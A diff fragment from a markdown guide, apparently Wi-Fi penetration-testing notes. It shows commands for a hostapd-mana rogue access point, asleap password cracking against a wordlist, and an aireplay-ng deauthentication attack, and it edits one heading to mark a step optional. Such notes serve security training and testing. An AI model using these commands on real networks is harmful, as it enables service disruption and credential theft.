@@ -257,7 +257,7 @@ sudo hostapd-mana /etc/hostapd-mana/mana.conf
 ```
 asleap -C <challengekey> -R <responsekey> -W /usr/share/john/password.lst
 ```
-**-----Sniff the traffic to make the certificate looks similar with the real AP-----**
+**-----Sniff the traffic to make the certificate looks similar with the real AP (Optional)-----**
 1. Deauthentication attack
 ```
 aireplay-ng -0 1 -a <bssid of the AP> -h <wireless card MAC addr> wlan0mon 
